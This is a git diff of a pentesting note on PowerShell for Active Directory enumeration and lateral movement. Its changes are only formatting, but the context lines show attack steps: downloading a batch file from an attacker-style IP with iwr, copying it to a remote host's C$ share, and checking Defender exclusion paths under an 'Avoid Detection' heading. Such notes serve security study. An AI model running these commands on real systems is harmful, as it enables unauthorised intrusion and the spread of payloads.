@@ -1,8 +1,16 @@
 ---
-{"publish":true,"created":"2025-02-23T23:53:09.700+05:30","modified":"2025-04-04T22:09:53.807+05:30","published":"2025-04-04T22:09:53.807+05:30","tags":["general","domain-enumeration","lateral-movement"],"cssclasses":""}
+publish: true
+created: 2025-02-23T23:53:09.700+05:30
+modified: 2025-04-04T22:09:53.807+05:30
+published: 2025-04-04T22:09:53.807+05:30
+tags:
+  - general
+  - domain-enumeration
+  - lateral-movement
 ---
 
 ##### Introduction
+
 - Case insensitive
 - .NET compliant and reliant, classes for AD are in System.DirectoryServices.ActiveDirectory
 - Shell of the future, shell for the cloud
@@ -79,6 +87,7 @@ iwr http://10.0.2.15/Safety.bat -OutFile C:\Users\Public\Argsplit.bat
 ```batch title:"Remotely copy"
 echo F | xcopy C:\Users\Public\Argsplit.bat \\remote-machine\C$\Users\Public\Safety.bat
 ```
+
 ###### Avoid Detection
 
 ```batch title:"Portforwarding from an advanced foothold"
@@ -122,4 +131,3 @@ Get-MpPreference | select -Property ExclusionPath
 ```powershell title:":)"
 ls :env
 ```
-
